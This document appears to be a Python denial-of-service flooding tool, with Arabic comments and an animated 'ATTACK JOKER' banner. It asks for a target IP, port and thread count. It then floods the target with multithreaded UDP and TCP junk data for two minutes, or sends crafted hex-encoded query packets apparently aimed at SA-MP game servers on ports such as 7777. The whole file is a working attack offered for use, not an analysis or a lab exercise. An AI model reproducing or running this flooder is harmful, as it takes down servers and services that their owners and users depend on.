import random
import threading
import codecs
import time
import socket
import sys
import os

# تنظيف الشاشة
os.system('cls' if os.name == 'nt' else 'clear')

# طباعة ATTACK مع الحركة ثم كلمة JOKER
def print_attack_title():
    attack_title = """
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
███████║   ██║      ██║   ███████║██║     █████╔╝ 
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """
    
    # طباعة ATTACK مع الحركة
    colors = [214, 220, 208, 226, 202, 203]  # مجموعة من الألوان المتدرجة
    for i in range(len(attack_title)):
        print(f"\033[38;5;{colors[i % len(colors)]}m{attack_title[i]}", end='', flush=True)
        time.sleep(0.05)  # التأخير بين كل حرف لإعطاء تأثير الحركة

    print("\033[0m")  # إعادة اللون للون الافتراضي بعد الانتهاء
    time.sleep(1)  # تأخير بين العناوين

    # طباعة كلمة "JOKER"
    joker_title = "JOKER"
    for i in range(len(joker_title)):
        print(f"\033[38;5;{colors[i % len(colors)]}m{joker_title[i]}", end='', flush=True)
        time.sleep(0.1)  # التأخير بين كل حرف لإعطاء تأثير الحركة
    print("\033[0m")  # إعادة اللون للون الافتراضي بعد الانتهاء

# طباعة العنوان المتحرك
print_attack_title()

# إدخال البيانات
ip = str(input("\033[38;5;220mTarget IP:\033[0m "))
port = int(input("\033[38;5;220mTarget Port:\033[0m "))
choice = str(input("\033[38;5;220mAttack? (y/n):\033[0m "))
threads = int(input("\033[38;5;220mThreads:\033[0m "))
fake_ip = '182.21.20.32'
times = 500000  # قوة الهجوم
duration = 120  # وقت الهجوم بالثواني

# باكيتات خاصة
Pacotes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
    codecs.decode("081e62da", "hex_codec"),
    codecs.decode("081e77da", "hex_codec"),
    codecs.decode("081e4dda", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("081e7eda", "hex_codec")
]

def run_udp():
    data = random._urandom(1460)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print("\033[38;5;208m[ATTACK] PACKET SENT (UDP)\033[0m")
        except:
            print("\033[38;5;196m[ERROR] FAILED TO SEND (UDP)\033[0m")

def run_tcp():
    data = random._urandom(1204)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for x in range(times):
                s.send(data)
            print("\033[38;5;208m[ATTACK] PACKET SENT (TCP)\033[0m")
        except:
            s.close()
            print("\033[38;5;196m[ERROR] FAILED TO SEND (TCP)\033[0m")

def run_packets():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 5)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
        except:
            pass

# بدء الهجوم
if __name__ == '__main__':
    try:
        if choice.lower() == 'y':
            for _ in range(threads):
                threading.Thread(target=run_udp).start()
                threading.Thread(target=run_tcp).start()
        else:
            for _ in range(threads):
                threading.Thread(target=run_packets).start()
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
